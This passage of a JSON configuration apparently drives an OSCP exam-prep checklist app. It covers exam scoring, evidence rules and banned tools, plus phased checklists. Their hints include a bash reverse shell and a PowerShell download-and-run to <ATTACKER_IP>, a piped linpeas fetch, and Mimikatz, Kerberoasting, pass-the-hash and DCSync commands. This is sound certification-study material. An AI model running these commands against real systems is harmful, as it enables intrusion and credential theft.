     "text": "Zero points are awarded for a target if you used a restricted tool on it, used Metasploit modules or Meterpreter on more than one machine, failed to provide flag contents in both the control panel and an interactive-shell screenshot, or provided insufficient documentation.",
     "enforceable": "evidence:required:local.txt,proof.txt",
     "source": "https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "limited",
     "confidence": "official",
     "advisory": true,
     "text": "Interfaces built on Metasploit — Armitage, Cobalt Strike, Metasploit Community Edition — inherit the same one-machine limit rather than being separately banned. (Cobalt Strike is separately out under the commercial-tools rule.)",
     "enforceable": "budget:metasploit:1",
     "source": "https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide"
    }
   ],
   "evidenceRules": [
    {
     "appliesTo": "*",
     "requirement": "The only valid way to show a proof file is in an interactive shell on the target, using `cat` or `type`, reading the file from its ORIGINAL location. Obtaining the contents any other way scores zero for the whole target — this explicitly includes any type of web-based shell.",
     "source": "https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "confidence": "official"
    },
    {
     "appliesTo": "*",
     "requirement": "Each local.txt and proof.txt must be shown in a screenshot that includes the contents of the file AS WELL AS the IP address of the target, obtained with ipconfig, ifconfig or ip addr — both in the same frame.",
     "source": "https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "confidence": "official"
    },
    {
     "appliesTo": "*",
     "requirement": "The contents of local.txt and proof.txt must also be submitted in the exam control panel before the exam has ended. A screenshot alone, or a panel submission alone, is not enough — missing either scores zero for that target.",
     "source": "https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "confidence": "official"
    },
    {
     "appliesTo": "*",
     "requirement": "proof.txt is only accessible to root or Administrator and lives in /root/ or on the Administrator Desktop. On Windows targets the shell must be running as SYSTEM, Administrator, or a user with Administrator privileges; on Linux targets it must be a root shell — otherwise full points are not awarded.",
     "source": "https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "confidence": "official"
    },
    {
     "appliesTo": "ad3-proof",
     "requirement": "[Inferred from the general rule, not a DC-specific one OffSec published] The DC proof must come from an interactive shell running with Administrator/SYSTEM privileges on the domain controller itself — a secretsdump output or a hash dump is not a substitute for the cat/type screenshot.",
     "source": "https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "confidence": "inferred"
    },
    {
     "appliesTo": "*",
     "requirement": "Every attack must be documented with all steps, commands issued and console output, thorough enough that a technically competent reader can replicate it step by step. Insufficient documentation means reduced or zero points, and nothing can be added after submission.",
     "source": "https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "confidence": "official"
    },
    {
     "appliesTo": "*",
     "requirement": "If you modified an exploit you must include: the modified exploit code, the URL of the original, the command used to generate any shellcode, highlighted changes, and an explanation of why. If you did NOT modify it, provide only the URL — do not paste the unmodified code.",
     "source": "https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "confidence": "official"
    }
   ],
   "reportSections": [
    "OffSec Certified Professional Exam Report — Introduction",
    "Objective",
    "Requirements",
    "High-Level Summary",
    "Recommendations",
    "Methodologies — Information Gathering",
    "Methodologies — Service Enumeration",
    "Methodologies — Penetration",
    "Methodologies — Maintaining Access",
    "Methodologies — House Cleaning",
    "Independent Challenges — Target #N: Initial Access",
    "Independent Challenges — Target #N: Service Enumeration",
    "Independent Challenges — Target #N: Privilege Escalation",
    "Independent Challenges — Target #N: Post Exploitation (local.txt / proof.txt)",
    "Active Directory Set — Host #N: Initial Access",
    "Active Directory Set — Host #N: Privilege Escalation",
    "Active Directory Set — Host #N: Post-Exploitation (flag)",
    "Additional Items Not Mentioned in the Report"
   ],
   "sources": [
    "https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
    "https://help.offsec.com/hc/en-us/articles/4412170923924-OSCP-Exam-FAQ",
    "https://help.offsec.com/hc/en-us/articles/29865898402836-OSCP-Exam-Changes",
    "https://help.offsec.com/hc/en-us/articles/29840452210580-Changes-to-the-OSCP",
    "https://www.offsec.com/pwk-online/OSCP-Exam-Report.docx"
   ],
   "unverified": [
    "PLAYBOOK OVERLAP — reuse, do not fork: phase `recon` + `svc-enum` overlap the existing `initial-recon` playbook (its per-port triage matrix is deeper; consider linking to it from `svc-enum` rather than duplicating). Phase `web-discovery` overlaps `web` (Mapping + Vulnerability Testing phases) — the exam version differs only in that sqlmap is removed. Phase `foothold`/`shell` overlaps `general` (Foothold phase). Phase `privesc` is a deliberate thin triage over the existing `linux-privesc` and `windows-privesc` playbooks — it should link to them, not restate them. Phases `ad-initial`/`ad-harvest`/`ad-lateral`/`ad-domain` overlap `ad` and `ad-detailed`; the ONLY substantive difference is that every Responder/LLMNR-poisoning/ntlmrelayx item in those playbooks is exam-illegal here (spoofing ban) and the exam starts from provided credentials, so `ad-detailed` phase 0 must not be reused verbatim. Phase `ad-lateral`'s pivot items overlap the `pivoting` playbook (chisel/ligolo/proxychains are exam-legal; only Metasploit pivoting is banned).",
    "The existing `buffer-overflow` playbook is deliberately NOT wired into this preset: the current official exam guide makes no mention of a stack buffer-overflow target, but OffSec does not publish a statement that one can never appear, so I could not verify either way.",
    "AD set composition (2 clients + 1 domain controller) is NOT stated in the current exam guide, which says only '1 Active Directory (AD) set containing 3 machines'. The 2-clients-plus-DC shape is carried over from the pre-Nov-2024 guide and from the official report template's AD example. Target `kind` values ad-client/ad-dc should be treated as a UI hint, not an exam fact.",
    "Per-AD-machine flag naming is not published. The guide says only that 'each target machine contains at least one proof file (local.txt or proof.txt)' and that specific objectives and point values live in the exam control panel. The flags modelled here as one flag per AD machine may in reality be a local.txt/proof.txt pair on some hosts — the app should let the candidate rename or split them.",
    "Whether the AD set requires pivoting is explicitly answered by OffSec as 'there may be' — it is not guaranteed, so the pivot items in `ad-lateral` are conditional.",
    "The exam guide does not enumerate a complete allowed-tools list and states OffSec 'will not comment on allowed or restricted tools, other than what is included inside this exam guide'. Any tool-ban enforcement in the app must be advisory only, and must not claim a tool is safe merely because it is not on the ban list.",
    "Report section headings are taken from the official OSCP Exam Report template v2.0 (Copyright 2024 OffSec) table of contents. OffSec permits your own template provided the required information is present, so these should be editable."
   ],
   "notes": [
    "Buffer overflow targets are out of scope: OffSec removed BOF from the course material and the exam body of knowledge. What remains in scope is FIXING a public memory-corruption exploit — cross-compiling it, correcting offsets and shellcode — which is a different skill.",
    "Taught in PEN-200, banned on the exam: the current Body of Knowledge still includes \"Vulnerability Scanning with Nessus\", while the exam guide bans Nessus outright."
   ],
   "kind": "targets",
   "appFeatures": []
  },
  {
   "id": "oscp",
   "name": "OSCP (legacy, pre-1 Nov 2024)",
   "icon": "📜",
   "tagline": "The retired OSCP format — all-or-nothing AD set and 10 bonus points. Use only for practising against pre-2025 write-ups; it is NOT the exam you will sit today.",
   "focus": "mixed",
   "durationMin": 1425,
   "reportHours": 24,
   "passMark": 70,
   "totalPoints": 100,
   "scoringNote": "RETIRED FORMAT. 3 independent 2-step targets at 20 points each (10 low-privilege, 10 privilege escalation) = 60, plus an Active Directory set of 2 clients and 1 domain controller worth 40 — awarded ONLY for the full exploit chain of the domain, with no partial points. 70/100 to pass, 100 the exam maximum. A separate 10 bonus points (taking the practical ceiling to 110) were earned before the exam by completing at least 80% of the module lab questions in every PEN-200 module and submitting 30 correct proof.txt hashes from the challenge labs; those bonus points were valid only for exams taken on or before 31 October 2024.",
   "targets": [
    {
     "key": "independent-1",
     "label": "Independent target #1",
     "kind": "standalone",
     "points": 20,
     "flags": [
      {
       "id": "ind1-local",
       "label": "local.txt — low-privilege access",
       "points": 10
      },
      {
       "id": "ind1-proof",
       "label": "proof.txt — root / SYSTEM / Administrator",
       "points": 10
      }
     ]
    },
    {
     "key": "independent-2",
     "label": "Independent target #2",
     "kind": "standalone",
     "points": 20,
     "flags": [
      {
       "id": "ind2-local",
       "label": "local.txt — low-privilege access",
       "points": 10
      },
      {
       "id": "ind2-proof",
       "label": "proof.txt — root / SYSTEM / Administrator",
       "points": 10
      }
     ]
    },
    {
     "key": "independent-3",
     "label": "Independent target #3",
     "kind": "standalone",
     "points": 20,
     "flags": [
      {
       "id": "ind3-local",
       "label": "local.txt — low-privilege access",
       "points": 10
      },
      {
       "id": "ind3-proof",
       "label": "proof.txt — root / SYSTEM / Administrator",
       "points": 10
      }
     ]
    },
    {
     "key": "ad-client-1",
     "label": "AD set — client #1 (no points on its own)",
     "kind": "ad-client",
     "points": 0,
     "flags": [
      {
       "id": "legacy-ad-c1",
       "label": "Client #1 flag — required for the chain, worth 0 by itself",
       "points": 0
      }
     ]
    },
    {
     "key": "ad-client-2",
     "label": "AD set — client #2 (no points on its own)",
     "kind": "ad-client",
     "points": 0,
     "flags": [
      {
       "id": "legacy-ad-c2",
       "label": "Client #2 flag — required for the chain, worth 0 by itself",
       "points": 0
      }
     ]
    },
    {
     "key": "ad-dc",
     "label": "AD set — domain controller (carries the whole 40)",
     "kind": "ad-dc",
     "points": 40,
     "flags": [
      {
       "id": "legacy-ad-dc",
       "label": "Full domain exploit chain complete (all three AD hosts) — all-or-nothing 40 points",
       "points": 40
      }
     ]
    }
   ],
   "phases": [
    {
     "id": "bonus-prep",
     "name": "Bonus Points (pre-exam, retired)",
     "goal": "Bank the 10 bonus points before exam day — only valid for exams sat on or before 31 October 2024.",
     "items": [
      {
       "label": "Complete at least 80% of the module lab questions in EVERY PEN-200 learning module",
       "hint": ""
      },
      {
       "label": "Submit 30 correct proof.txt hashes from PEN-200 challenge lab machines on the OffSec Learning Platform",
       "hint": ""
      },
      {
       "label": "Submit local.txt as well as proof.txt so lab progress tracks accurately",
       "hint": ""
      },
      {
       "label": "Verify the completed percentage under Course Progress before booking the exam",
       "hint": ""
      }
     ]
    },
    {
     "id": "setup",
     "name": "Exam Setup & Clock",
     "goal": "VPN up, objectives read, logging running, budgets understood — before the first packet leaves your box.",
     "items": [
      {
       "label": "Connect the exam VPN",
       "hint": "sudo openvpn OS-XXXXX-OSCP.ovpn"
      },
      {
       "label": "Confirm tun0 is up",
       "hint": "ip addr show tun0"
      },
      {
       "label": "Read every target's objectives and point values in the exam control panel",
       "hint": ""
      },
      {
       "label": "Create one working directory per target",
       "hint": "mkdir -p ~/exam/{t1,t2,t3,ad}/{nmap,loot,screens}"
      },
      {
       "label": "Start a terminal log",
       "hint": "script -q -f ~/exam/console-$(date +%F-%H%M).log"
      },
      {
       "label": "Decide which single target will spend the Metasploit allowance",
       "hint": ""
      },
      {
       "label": "Remember the AD set is all-or-nothing: 40 points or zero — budget your time accordingly",
       "hint": ""
      }
     ]
    },
    {
     "id": "recon",
     "name": "Recon — Full Port Discovery",
     "goal": "Every open TCP port on the target plus the top UDP ports, with nothing missed above 1024.",
     "items": [
      {
       "label": "Full TCP sweep of all 65535 ports",
       "hint": "sudo nmap -p- --min-rate 2000 -T4 -Pn -oA nmap/<TARGET_IP>-all <TARGET_IP>"
      },
      {
       "label": "Script and version scan on the open ports only",
       "hint": "sudo nmap -sC -sV -p<PORT> -oA nmap/<TARGET_IP>-svc <TARGET_IP>"
      },
      {
       "label": "Top UDP ports",
       "hint": "sudo nmap -sU --top-ports 100 -oA nmap/<TARGET_IP>-udp <TARGET_IP>"
      },
      {
       "label": "Record the exact product and version of every service",
       "hint": ""
      },
      {
       "label": "Add hostnames from banners and certificates to /etc/hosts",
       "hint": "echo '<TARGET_IP> <DOMAIN>' | sudo tee -a /etc/hosts"
      }
     ]
    },
    {
     "id": "svc-enum",
     "name": "Service Enumeration",
     "goal": "Each open port enumerated by hand to a named product, a version, and what it will talk to unauthenticated.",
     "items": [
      {
       "label": "SMB null session, shares and signing",
       "hint": "nxc smb <TARGET_IP> -u '' -p '' --shares"
      },
      {
       "label": "RPC user enumeration",
       "hint": "rpcclient -U '' -N <TARGET_IP> -c 'enumdomusers'"
      },
      {
       "label": "FTP anonymous login",
       "hint": "ftp <TARGET_IP>"
      },
      {
       "label": "SNMP community walk",
       "hint": "snmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.2.1.25.4.2.1.2"
      },
      {
       "label": "NFS exports",
       "hint": "showmount -e <TARGET_IP>"
      },
      {
       "label": "SMTP user enumeration",
       "hint": "smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t <TARGET_IP>"
      },
      {
       "label": "Database services with default/reused credentials",
       "hint": "impacket-mssqlclient <USER>:'<PASSWORD>'@<TARGET_IP> -windows-auth"
      },
      {
       "label": "searchsploit every product/version pair",
       "hint": "searchsploit <product> <version>"
      }
     ]
    },
    {
     "id": "web-discovery",
     "name": "Web Content Discovery",
     "goal": "The full URL surface mapped by hand — no automatic exploitation tooling.",
     "items": [
      {
       "label": "Fingerprint the stack",
       "hint": "whatweb -a3 <TARGET_URL>"
      },
      {
       "label": "Nikto — explicitly permitted",
       "hint": "nikto -h <TARGET_URL>"
      },
      {
       "label": "Directory and file discovery",
       "hint": "feroxbuster -u <TARGET_URL> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,asp,aspx,txt,bak"
      },
      {
       "label": "Second pass with a different wordlist",
       "hint": "gobuster dir -u <TARGET_URL> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,zip,bak"
      },
      {
       "label": "Virtual host fuzzing",
       "hint": "ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://<TARGET_IP> -H 'Host: FUZZ.<DOMAIN>' -ac"
      },
      {
       "label": "robots.txt, sitemap, JS bundles and HTML comments",
       "hint": "curl -s <TARGET_URL>/robots.txt"
      },
      {
       "label": "Manual injection and traversal testing through Burp Free — sqlmap is banned",
       "hint": "curl -s '<TARGET_URL>/?page=../../../../etc/passwd'"
      }
     ]
    },
    {
     "id": "foothold",
     "name": "Foothold — Low-Privilege Access (10 pts)",
     "goal": "Code execution as any user, from a technique you can explain and replay.",
     "items": [
      {
       "label": "Pull a readable PoC for the exact version",
       "hint": "searchsploit -m <edb-id>"
      },
      {
       "label": "Read the exploit and fix hardcoded IPs, ports and offsets",
       "hint": ""
      },
      {
       "label": "If this is your Metasploit target, commit now — the allowance locks on first use, including `check`",
       "hint": ""
      },
      {
       "label": "msfvenom is allowed against every target",
       "hint": "msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o rev.exe"
      },
      {
       "label": "Serve the payload",
       "hint": "python3 -m http.server 80"
      },
      {
       "label": "Start the listener first",
       "hint": "rlwrap nc -lvnp <LPORT>"
      },
      {
       "label": "Linux reverse shell",
       "hint": "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<LPORT> 0>&1'"
      },
      {
       "label": "Windows PowerShell download-and-run",
       "hint": "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/rev.ps1')\""
      }
     ]
    },
    {
     "id": "shell",
     "name": "Shell Stabilisation",
     "goal": "A fully interactive TTY — a proof screenshot from a web shell voids the machine.",
     "items": [
      {
       "label": "Spawn a PTY",
       "hint": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
      },
      {
       "label": "Raw mode for a full TTY",
       "hint": "stty raw -echo; fg"
      },
      {
       "label": "Fix TERM and window size",
       "hint": "export TERM=xterm; stty rows 50 cols 200"
      },
      {
       "label": "Windows: move to WinRM once you have credentials",
       "hint": "evil-winrm -i <TARGET_IP> -u <USER> -p '<PASSWORD>'"
      },
      {
       "label": "Establish a second way back in before you break anything",
       "hint": ""
      }
     ]
    },
    {
     "id": "local-flag",
     "name": "local.txt — Capture & Prove",
     "goal": "local.txt read with cat/type from its original location in an interactive shell, screenshotted with the target's own IP in frame, and submitted in the control panel.",
     "items": [
      {
       "label": "Locate local.txt",
       "hint": "find / -name local.txt 2>/dev/null"
      },
      {
       "label": "Linux: read it in place",
       "hint": "cat /home/<USER>/local.txt"
      },
      {
       "label": "Windows: read it in place",
       "hint": "type C:\\Users\\<USER>\\Desktop\\local.txt"
      },
      {
       "label": "Screenshot contents + target IP in one frame (Linux)",
       "hint": "cat /home/<USER>/local.txt; ip addr"
      },
      {
       "label": "Screenshot contents + target IP in one frame (Windows)",
       "hint": "type C:\\Users\\<USER>\\Desktop\\local.txt & ipconfig"
      },
      {
       "label": "Submit the hash in the control panel immediately",
       "hint": ""
      }
     ]
    },
    {
     "id": "sitawareness",
     "name": "Situational Awareness",
     "goal": "Know who you are, what the host runs and what it connects to, before guessing at escalation.",
     "items": [
      {
       "label": "Identity, groups, sudo rights",
       "hint": "id; sudo -l"
      },
      {
       "label": "Windows identity and token privileges",
       "hint": "whoami /all"
      },
      {
       "label": "OS, kernel and patch level",
       "hint": "uname -a; cat /etc/os-release"
      },
      {
       "label": "Windows build and hotfixes",
       "hint": "systeminfo"
      },
      {
       "label": "Processes owned by root/SYSTEM",
       "hint": "ps auxww"
      },
      {
       "label": "Internal-only listeners",
       "hint": "ss -tulpn"
      },
      {
       "label": "Extra interfaces and routes — the AD set may sit behind one",
       "hint": "ip a; ip route"
      }
     ]
    },
    {
     "id": "privesc",
     "name": "Privilege Escalation (10 pts)",
     "goal": "root, or SYSTEM / Administrator / an administrator-privileged user — anything less scores 10, not 20.",
     "items": [
      {
       "label": "linpeas",
       "hint": "curl -sL http://<ATTACKER_IP>/linpeas.sh | sh"
      },
      {
       "label": "winPEAS",
       "hint": "winPEASx64.exe quiet"
      },
      {
       "label": "sudo rights against GTFOBins",
       "hint": "sudo -l"
      },
      {
       "label": "SUID/SGID binaries",
       "hint": "find / -perm -4000 -type f 2>/dev/null"
      },
      {
       "label": "Capabilities",
       "hint": "getcap -r / 2>/dev/null"
      },
      {
       "label": "Cron and hidden root processes",
       "hint": "cat /etc/crontab; ./pspy64"
      },
      {
       "label": "Windows impersonation privileges",
       "hint": "whoami /priv | findstr /i impersonate"
      },
      {
       "label": "PrintSpoofer — an explicitly allowed tool",
       "hint": "PrintSpoofer64.exe -i -c cmd"
      },
      {
       "label": "Service misconfigurations and unquoted paths",
       "hint": "sc qc <service>"
      },
      {
       "label": "Credential hunting and reuse across accounts",
       "hint": "grep -riE 'password|passwd|secret' /var/www /opt /home 2>/dev/null"
      },
      {
       "label": "Kernel exploits last — verify version and architecture first",
       "hint": ""
      },
      {
       "label": "Full matrix lives in the Linux/Windows Privilege Escalation playbooks",
       "hint": ""
      }
     ]
    },
    {
     "id": "proof-flag",
     "name": "proof.txt — Capture & Prove",
     "goal": "proof.txt read as root/SYSTEM from its original location in an interactive shell, with the target IP in the same screenshot.",
     "items": [
      {
       "label": "Prove the privilege level in the same evidence",
       "hint": "id"
      },
      {
       "label": "Windows: show the account's groups",
       "hint": "whoami /groups"
      },
      {
       "label": "Linux: read proof.txt from /root",
       "hint": "cat /root/proof.txt"
      },
      {
       "label": "Windows: read proof.txt from the Administrator Desktop",
       "hint": "type C:\\Users\\Administrator\\Desktop\\proof.txt"
      },
      {
       "label": "Screenshot contents + target IP in one frame (Linux)",
       "hint": "cat /root/proof.txt; ip addr"
      },
      {
       "label": "Screenshot contents + target IP in one frame (Windows)",
       "hint": "type C:\\Users\\Administrator\\Desktop\\proof.txt & ipconfig"
      },
      {
       "label": "Submit the hash in the control panel before the clock ends",
       "hint": ""
      }
     ]
    },
    {
     "id": "legacy-ad-entry",
     "name": "AD (legacy) — Gated Initial Compromise",
     "goal": "Break into the first AD client from the network with no credentials supplied — in this format the whole 40 points sits behind this one step.",
     "items": [
      {
       "label": "Scan the AD subnet and identify the two clients and the domain controller",
       "hint": "sudo nmap -p- --min-rate 2000 -Pn -oA nmap/ad-<TARGET_IP> <TARGET_IP>"
      },
      {
       "label": "Identify the domain name and DC from SMB/LDAP",
       "hint": "nxc smb <DC_IP>"
      },
      {
       "label": "Anonymous LDAP naming contexts",
       "hint": "ldapsearch -x -H ldap://<DC_IP> -s base namingcontexts"
      },
      {
       "label": "Enumerate domain users over Kerberos pre-auth (no credentials needed)",
       "hint": "kerbrute userenum -d <DOMAIN> --dc <DC_IP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"
      },
      {
       "label": "AS-REP roast any account without pre-authentication",
       "hint": "impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC_IP> -usersfile users.txt -no-pass -format hashcat"
      },
      {
       "label": "Do NOT use Responder or any poisoning/relay — spoofing is banned",
       "hint": ""
      },
      {
       "label": "Exploit the exposed service on client #1 to get code execution",
       "hint": ""
      },
      {
       "label": "Stabilise the shell and capture the flag on client #1",
       "hint": "type C:\\Users\\<USER>\\Desktop\\local.txt & ipconfig"
      }
     ]
    },
    {
     "id": "legacy-ad-creds",
     "name": "AD (legacy) — Credential Harvesting",
     "goal": "Turn the first foothold into domain credentials good enough to move sideways.",
     "items": [
      {
       "label": "Dump local SAM and LSA secrets on the compromised client",
       "hint": "nxc smb <TARGET_IP> -u <USER> -p '<PASSWORD>' --sam --lsa"
      },
      {
       "label": "Dump in-memory credentials with Mimikatz",
       "hint": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit"
      },
      {
       "label": "Collect BloodHound data with the first valid domain account",
       "hint": "bloodhound-python -u <USER> -p '<PASSWORD>' -d <DOMAIN> -ns <DC_IP> -c all --zip"
      },
      {
       "label": "Read the password policy before any spraying",
       "hint": "nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' --pass-pol"
      },
      {
       "label": "Kerberoast service accounts",
       "hint": "impacket-GetUserSPNs <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip <DC_IP> -request -outputfile spn.hash"
      },
      {
       "label": "Crack the TGS hashes",
       "hint": "hashcat -m 13100 spn.hash /usr/share/wordlists/rockyou.txt"
      },
      {
       "label": "Hunt SYSVOL scripts and GPP cpassword",
       "hint": "nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -M gpp_password"
      }
     ]
    },
    {
     "id": "legacy-ad-lateral",
     "name": "AD (legacy) — Lateral Movement to Client #2",
     "goal": "A shell on the second client using harvested credentials or hashes.",
     "items": [
      {
       "label": "Spray the credential/hash across the AD subnet to find admin access",
       "hint": "nxc smb <DC_IP>/24 -u <USER> -H <HASH>"
      },
      {
       "label": "Execute over WMI",
       "hint": "impacket-wmiexec <DOMAIN>/<USER>:'<PASSWORD>'@<TARGET_IP>"
      },
      {
       "label": "PsExec with a hash",
       "hint": "impacket-psexec <DOMAIN>/<USER>@<TARGET_IP> -hashes :<HASH>"
      },
      {
       "label": "WinRM with pass-the-hash",
       "hint": "evil-winrm -i <TARGET_IP> -u <USER> -H <HASH>"
      },
      {
       "label": "Pivot with chisel or ligolo if the DC is not routable — never with Metasploit",
       "hint": "./chisel client <ATTACKER_IP>:8000 R:socks"
      },
      {
       "label": "Re-dump credentials on the new host",
       "hint": "nxc smb <TARGET_IP> -u <USER> -p '<PASSWORD>' --sam --lsa"
      },
      {
       "label": "Capture and screenshot the flag on client #2",
       "hint": "type C:\\Users\\Administrator\\Desktop\\proof.txt & ipconfig"
      }
     ]
    },
    {
     "id": "legacy-ad-dc",
     "name": "AD (legacy) — Domain Controller (40 pts, all or nothing)",
     "goal": "Full domain compromise — in this format nothing in the AD set scores until the entire chain is complete.",
     "items": [
      {
       "label": "Work the BloodHound shortest path to Domain Admins",
       "hint": ""
      },
      {
       "label": "Abuse an ACL edge",
       "hint": "bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add groupMember '<GROUP>' <USER>"
      },
      {
       "label": "Delegation abuse to impersonate an administrator",
       "hint": "impacket-getST -spn cifs/<DC_IP> -impersonate Administrator <DOMAIN>/<USER>:'<PASSWORD>'"
      },
      {
       "label": "DCSync once replication rights are held",
       "hint": "impacket-secretsdump <DOMAIN>/<USER>:'<PASSWORD>'@<DC_IP> -just-dc-user krbtgt"
      },
      {
       "label": "Dump the domain hashes",
       "hint": "impacket-secretsdump -just-dc <DOMAIN>/<USER>@<DC_IP>"
      },
      {
       "label": "Own the DC with an interactive shell",
       "hint": "impacket-psexec <DOMAIN>/Administrator@<DC_IP> -hashes :<HASH>"
      },
      {
       "label": "Capture proof.txt on the DC with the IP in the same frame",
       "hint": "type C:\\Users\\Administrator\\Desktop\\proof.txt & ipconfig"
      },
      {
       "label": "Document the full chain across all three hosts — partial chains score zero in this format",
       "hint": ""
      }
     ]
    },
    {
     "id": "evidence",
     "name": "Evidence Capture & Report Assembly",
     "goal": "A PDF a competent stranger could replay step by step, uploaded correctly inside the 24-hour window.",
     "items": [
      {
       "label": "Screenshot audit: one local.txt frame and one proof.txt frame per target, each showing the target's own IP",
       "hint": ""
      },
      {
       "label": "Every command and its console output pasted as text",
       "hint": ""
      },
      {
       "label": "Modified exploit: modified code, original URL, shellcode command, highlighted changes, and why",
       "hint": ""
      },
      {
       "label": "Unmodified exploit: URL only",
       "hint": ""
      },
      {
       "label": "Order machines in the report in the order you want them graded",
       "hint": ""
      },
      {
       "label": "Export to PDF with the exact case-sensitive filename",
       "hint": "OSCP-OS-XXXXX-Exam-Report.pdf"
      },
      {
       "label": "Archive as .7z with no password, under 200 MB",
       "hint": "7z a OSCP-OS-XXXXX-Exam-Report.7z OSCP-OS-XXXXX-Exam-Report.pdf"
      },
      {
       "label": "Verify the MD5 against the upload page",
       "hint": "md5sum OSCP-OS-XXXXX-Exam-Report.7z"
      },
      {
       "label": "Upload to https://upload.offsec.com within 24 hours and click Submit File",
       "hint": ""
      }
     ]
    }
   ],
   "rules": [
    {
     "kind": "required",
     "text": "RETIRED FORMAT. This exam was replaced on 1 November 2024 at 10:00 GMT. Do not sit an exam against these rules — use the OSCP+ preset. This preset exists for practising against pre-2025 write-ups and lab sets.",
     "enforceable": "banner:retired",
     "source": "https://help.offsec.com/hc/en-us/articles/29865898402836-OSCP-Exam-Changes",
     "confidence": "official"
    },
    {
     "kind": "required",
     "text": "Active Directory set: points are awarded only for the full exploit chain of the domain. No partial points are awarded — clearing two of the three AD hosts scores zero for the set.",
     "enforceable": "scoring:ad:all-or-nothing",
     "source": "http://web.archive.org/web/2024080100/https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "allowed",
     "text": "Ten bonus points are available, earned before the exam by completing at least 80% of the module lab questions in every PEN-200 module AND submitting 30 correct proof.txt hashes from the PEN-200 challenge lab machines. Valid only for exams taken on or before 31 October 2024.",
     "enforceable": "bonus:10:labs80+30proofs",
     "source": "http://web.archive.org/web/2024080100/https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "limited",
     "text": "Metasploit modules (Auxiliary, Exploit, Post) and the Meterpreter payload may be used against ONE single target machine of your choice; the choice locks on first use, including `check`, and cannot be moved if the attack fails.",
     "enforceable": "budget:metasploit:1",
     "source": "http://web.archive.org/web/2024080100/https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "banned",
     "text": "Metasploit cannot be used for pivoting — pivoting would use it against more than one target.",
     "enforceable": "",
     "source": "http://web.archive.org/web/2024080100/https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "allowed",
     "text": "exploit/multi/handler and msfvenom may be used against all target machines; only the meterpreter payload is limited to the one chosen target.",
     "enforceable": "budget:meterpreter:1",
     "source": "http://web.archive.org/web/2024080100/https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "limited",
     "text": "Spoofing of any kind — IP, ARP, DNS, NBNS, etc. — is prohibited, which rules out LLMNR/NBT-NS poisoning and the relay attacks that depend on it. Note the distinction: Responder itself is on OffSec's allowed-tools list; it is the poisoning and spoofing modes that are banned, not the binary.",
     "enforceable": "toolban:mitm6,arpspoof,ettercap,bettercap,dnsspoof",
     "source": "http://web.archive.org/web/2024080100/https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "confidence": "official",
     "advisory": true
    },
    {
     "kind": "banned",
     "text": "Automatic exploitation tools: OffSec names db_autopwn, browser_autopwn, SQLmap and SQLninja, plus \"anything that performs a similar function\". Only those four are published names — treat any other tool as your own judgement call, not a rule.",
     "enforceable": "toolban:sqlmap,sqlninja,db_autopwn,browser_autopwn,nessus,nexpose,openvas,canvas,coreimpact,saint",
     "source": "http://web.archive.org/web/2024080100/https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "confidence": "official",
     "advisory": true
    },
    {
     "kind": "banned",
     "text": "Commercial tools or services (Metasploit Pro, Burp Pro) and AI chatbots (KAI, ChatGPT, etc.).",
     "enforceable": "toolban:burpsuite-pro,metasploit-pro",
     "source": "http://web.archive.org/web/2024080100/https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "allowed",
     "text": "Nmap and its scripting engine, Nikto, Burp Free and DirBuster may be used against any target system.",
     "enforceable": "",
     "source": "http://web.archive.org/web/2024080100/https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "required",
     "text": "Flag contents must be submitted in the exam control panel before the clock ends, and the report uploaded to https://upload.offsec.com within 24 hours as a PDF inside a password-free .7z under 200 MB, with the exact case-sensitive filename.",
     "enforceable": "deadline:flags:exam-end;deadline:report:+24h;limit:archive:200MB",
     "source": "http://web.archive.org/web/2024080100/https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "limited",
     "confidence": "official",
     "advisory": true,
